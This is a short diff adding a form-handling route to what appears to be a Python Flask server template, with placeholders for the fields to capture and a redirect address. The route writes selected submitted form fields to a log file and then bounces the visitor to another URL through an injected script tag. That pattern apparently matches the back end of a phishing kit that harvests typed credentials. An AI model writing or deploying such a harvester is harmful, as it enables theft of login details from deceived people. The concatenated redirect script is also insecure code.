@@ -19,3 +19,16 @@ manager = Manager(app)
 LOG_FILE = 'log.txt'
 TO_LOG = __TO_LOG__
 REDIRECT_URL = '__REDIRECT_URL__'
+
+# form function
+@app.route('/form', methods=['POST'])
+def form():
+    with open(LOG_FILE, 'a') as f:
+        f.write(time.ctime() + '\n')
+        for i in TO_LOG:
+            if i in request.form:
+                log = i + ' = ' + request.form[i]
+                f.write(log + '\n')
+                print log
+        f.write('\n')
+    return "<script>window.location='" + REDIRECT_URL + "'</script>"
